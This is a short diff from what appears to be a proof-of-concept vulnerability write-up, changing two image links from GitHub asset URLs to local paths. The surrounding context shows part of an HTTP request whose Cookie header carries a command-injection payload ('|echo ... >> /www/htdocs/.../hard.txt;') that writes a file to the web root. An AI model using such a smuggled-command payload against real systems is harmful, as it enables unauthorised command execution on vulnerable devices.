@@ -18,9 +18,9 @@ Upgrade-Insecure-Requests: 1
 Connection: close
 Cookie: session_id_443=1|echo 'This a vulnerability!' >> /www/htdocs/site/image/hard.txt;
 ```
-![e5666ca9ef9cd6bfb4a912093e147e11](https://github.com/wy876/POC/assets/139549762/e4f18daa-2222-42c4-b52f-9b31e468fd44)
+![e5666ca9ef9cd6bfb4a912093e147e11](../../images/e4f18daa-2222-42c4-b52f-9b31e468fd44.png)
 
-![image](https://github.com/wy876/POC/assets/139549762/414a2d98-4206-415b-8252-2d56b397f9e2)
+![image](../../images/414a2d98-4206-415b-8252-2d56b397f9e2.png)
 
 
 ## nuclei 
